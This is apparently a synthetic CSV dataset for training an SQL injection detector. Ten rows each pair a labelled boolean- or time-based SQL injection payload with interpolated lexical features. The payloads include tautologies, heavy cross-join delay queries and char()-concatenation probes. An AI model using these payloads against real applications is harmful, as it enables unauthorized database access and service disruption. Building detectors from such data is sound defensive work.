id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.8166580659700727,153.25100087351697,35.515937772974056,4.179781864864071,73.92231288216368,16.0,46.625500436758486,16.703187554594813,0.48246788059344675,0.1046525221083851,0.3037765210467779,0.10910307625139026,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.703187554594811,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.703187554594811,0.29681244540518903,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000002,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000037,1.284843279308775,38.622261853947876,13.377738146052128,2.656843680367473,2.688869073026062,9.93339278092181,20.0,6.0,0.06994094685075447,0.25649247959835386,0.5181281335006859,0.15543844005020577,0.3111309269739362,0.0,1.6888690730260638,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,0.0,2.688869073026064,0.3111309269739361,0.0,0.6888690730260638,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.6888690730260637,0.31113092697393624,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000003,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000039,0.8733907026101768,129.0,29.0,4.229413054087282,81.67710248171034,4.4890310564820375,28.71160869768712,14.122257764120508,0.633155833191553,0.034798690360325846,0.22257061005959008,0.10947486638853107,0.0,2.6332267076384737,0.2445155282410174,0.0,1.0,0.1222577641205087,0.0,3.3667732923615272,0.0,0.0,2.8777422358794915,1.3667732923615254,0.0,0.8777422358794913,0.1222577641205087,0.0,3.469446951953614e-18,0.1222577641205087,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.0523138903203528,171.8295614722545,34.74241712344244,4.174392181761727,80.20077003397573,18.0,47.62879143827878,26.0,0.4665655322420732,0.10481576668770091,0.2772181491879912,0.15140055188223467,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,7.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,1.3143957191393898,0.6856042808606102,0.3143957191393898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.31439571913939
SMOTE_000005,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000033,0.1934866969074665,217.2130377200338,36.697069317394984,3.8422321439503606,66.09120795218494,31.515310907831967,85.97003567914294,33.63648318087398,0.30420042377843315,0.1449987249916915,0.3958692154589473,0.15493163577092803,1.9394138634789961,0.0,0.0,0.0,0.0,1.9394138634789961,0.0,17.878827726957994,0.0,1.0,3.0,9.818241590436989,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.9394138634789961,0.0,0.9394138634789961,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.878827726957992
SMOTE_000006,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000053,3.576300559422375,153.8490379438562,34.61634598128539,4.261205200130286,78.5648084860872,11.909422766313709,44.111922317655726,19.26288437379955,0.5147789818814602,0.07635712271591245,0.2843453110741539,0.12451858432847349,5.2930767850283145,0.0,0.3232691962570786,0.0,0.6767308037429214,1.3232691962570784,0.0,5.2930767850283145,0.0,0.0,2.030192411228764,3.616345981285393,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.3232691962570786,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3232691962570787,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.32326919625707873,0.32326919625707873,4.969807588771236
SMOTE_000007,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.0358477293502193,146.23281237478622,29.789843751527,3.3999276574795902,50.18203113242121,12.789843751526998,61.840624993892014,21.420312496946003,0.3187320032087735,0.09154867126179367,0.43823208307983796,0.1514872424495949,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.579687503053995,2.0,0.7898437515269973,2.0507812423650136,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000008,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000050,1.3838061255061753,71.69277949805817,27.080411151582926,3.9064977844801922,21.25773021654704,16.274226978345297,23.806184173237625,10.35463812992822,0.29311800674528493,0.23363758329650403,0.3316713516463921,0.1415730583118189,0.0,3.1773190649641103,1.2742269783452966,0.0,0.0,1.2742269783452964,0.0,3.177319064964111,0.0,0.7257730216547035,0.7257730216547036,2.548453956690593,0.0,1.0,0.2742269783452965,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.2742269783452965,0.0,1.0,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000009,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,2.980659942858227,33.55036556932038,14.550365569320375,2.963663635287232,4.798537722718493,5.852558985242634,15.100731138640754,7.798537722718496,0.14393866832840263,0.17293557519996977,0.44974956292750407,0.23337619354412353,0.5503655693203761,2.2481721533981194,2.0,0.0,0.0,0.9999999999999999,0.0,2.0,0.0,0.0,0.0,3.0,0.5503655693203761,0.44963443067962394,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.550365569320376,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000010,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,2.4704696548697087,362.76864378302315,30.685593207957528,3.3685232762619255,90.96949132732045,55.48474566366023,164.68559320795754,51.628813584084945,0.25036935889039913,0.15277494007429662,0.45433322893329287,0.14252247210201144,0.0,1.2576271681698872,2.3711864159150564,0.0,0.0,2.6855932079575284,0.0,34.0,0.6288135840849436,0.0,0.6855932079575282,15.056779623872586,0.0,0.31440679204247174,0.6855932079575282,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.6855932079575284,0.0,0.6855932079575282,0.0,0.3144067920424718,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6855932079575283,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.371186415915055
